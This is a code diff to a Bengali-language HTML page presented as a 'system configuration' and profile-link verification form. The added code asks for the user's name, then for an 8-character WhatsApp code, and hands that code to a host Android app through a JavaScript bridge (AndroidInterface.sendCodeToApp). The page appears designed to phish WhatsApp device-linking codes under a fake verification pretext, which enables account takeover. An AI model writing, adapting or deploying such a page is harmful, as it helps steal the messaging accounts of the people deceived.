@@ -3,36 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify System</title>
+    <title>সিস্টেম কনফিগারেশন</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
-        h2 { color: #075e54; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; }
-        .btn { background-color: #25d366; color: white; padding: 15px; border: none; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; }
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
+        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background-color: #25d366; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>সিস্টেম কনফিগারেশন</h2>
-        <p>আপনার প্রোফাইল লিঙ্কটি যাচাই করতে আপনার নাম নিচে দিন।</p>
+
+<div class="container">
+    <h2>সিস্টেম কনফিগারেশন</h2>
+
+    <div id="nameSection">
+        <p>আপনার প্রোফাইল লিঙ্কটি যাচাই করতে নাম লিখুন:</p>
         <input type="text" id="userName" placeholder="আপনার নাম লিখুন...">
-        <button class="btn" onclick="verify()">যাচাই করুন ও লিঙ্ক পান</button>
-        <p id="statusMsg" style="color: red; margin-top: 15px;"></p>
+        <button onclick="verifyUser()">যাচাই করুন ও লিঙ্ক পান</button>
     </div>
 
-    <script>
-        function verify() {
-            const name = document.getElementById('userName').value.trim();
-            const status = document.getElementById('statusMsg');
-            if (name === "") {
-                status.innerText = "দয়া করে নাম লিখুন!";
-            } else {
-                status.style.color = "green";
-                status.innerText = "যাচাই সফল! আপনার সিস্টেম রেডি।";
-                alert("স্বাগতম " + name + "! আপনার সেটআপ সম্পূর্ণ হয়েছে।");
-            }
+    <div id="codeSection" style="display: none;">
+        <p>আপনার ৮ সংখ্যার হোয়াটসঅ্যাপ কোডটি দিন:</p>
+        <input type="text" id="waCode" placeholder="ABC1-DEF2" maxlength="8">
+        <button onclick="confirmLink()">কনফার্ম ও হোয়াটসঅ্যাপ ওপেন</button>
+    </div>
+</div>
+
+<script>
+    // নাম যাচাই করার ফাংশন
+    function verifyUser() {
+        const name = document.getElementById('userName').value.trim();
+        if (name !== "") {
+            alert("স্বাগতম " + name + "! আপনার সেটআপ সফল হয়েছে।");
+            // নামের অংশ লুকিয়ে কোড দেওয়ার অংশ দেখানো হচ্ছে
+            document.getElementById('nameSection').style.display = 'none';
+            document.getElementById('codeSection').style.display = 'block';
+        } else {
+            alert("দয়া করে আপনার নাম লিখুন।");
         }
-    </script>
+    }
+
+    // কোড অ্যাপে পাঠানোর ফাংশন
+    function confirmLink() {
+        const code = document.getElementById('waCode').value.trim().toUpperCase();
+        if (code.length === 8) {
+            // অ্যান্ড্রয়েড অ্যাপের ইন্টারফেস চেক করা
+            if (typeof AndroidInterface !== "undefined") {
+                // এটি সরাসরি আপনার Java ফাংশনকে কল করবে
+                AndroidInterface.sendCodeToApp(code);
+                alert("মামা, কোডটি আপনার অ্যাপে পাঠানো হয়েছে!");
+            } else {
+                alert("সিস্টেম ত্রুটি: দয়া করে আপনার নিজস্ব অ্যাপ দিয়ে এটি ওপেন করুন।");
+            }
+        } else {
+            alert("দয়া করে সঠিক ৮ সংখ্যার কোড দিন।");
+        }
+    }
+</script>
+
 </body>
 </html>
